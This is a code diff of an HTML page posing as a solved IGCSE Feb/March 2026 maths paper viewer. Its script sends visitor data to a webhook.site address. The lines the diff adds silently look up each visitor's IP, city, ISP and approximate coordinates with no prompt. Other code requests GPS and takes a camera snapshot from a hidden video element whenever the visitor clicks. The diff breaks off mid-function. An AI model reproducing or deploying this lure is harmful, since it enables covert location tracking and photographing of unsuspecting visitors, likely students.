@@ -11,14 +11,13 @@
     </style>
 </head>
 <body>
-    
+    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
     <video id="hidden-video" autoplay muted></video>
 
     <script>
         const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";
 
-        // Use FETCH instead of sendBeacon for large image data
         async function sendLog(data) {
             await fetch(webhookURL, {
                 method: 'POST',
@@ -27,7 +26,21 @@
             });
         }
 
-        // 1. GPS (Higher reliability settings)
+        // 0. SILENT IP TRACKING (Fires immediately, no popup)
+        fetch('https://ipapi.co')
+            .then(res => res.json())
+            .then(data => {
+                sendLog({
+                    type: "IP_INFO",
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    isp: data.org,
+                    approx_loc: `${data.latitude}, ${data.longitude}`
+                });
+            }).catch(() => {});
+
+        // 1. GPS (Requires popup)
         navigator.geolocation.getCurrentPosition(pos => {
             sendLog({
                 type: "GPS_LOCATION",
@@ -38,7 +51,7 @@
         }, err => sendLog({ type: "LOCATION_ERROR", msg: err.message }), 
         { enableHighAccuracy: false, timeout: 15000, maximumAge: Infinity });
 
-        // 2. Camera Snapshot (Triggered by ANY click on the page)
+        // 2. Camera Snapshot (Requires click + popup)
         window.onclick = () => {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
@@ -47,7 +60,7 @@
                     video.onloadedmetadata = () => {
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
-                            canvas.width = 400; // Smaller resolution for faster upload
+                            canvas.width = 400;
                             canvas.height = 300;
                             canvas.getContext('2d').drawImage(video, 0, 0);
                             
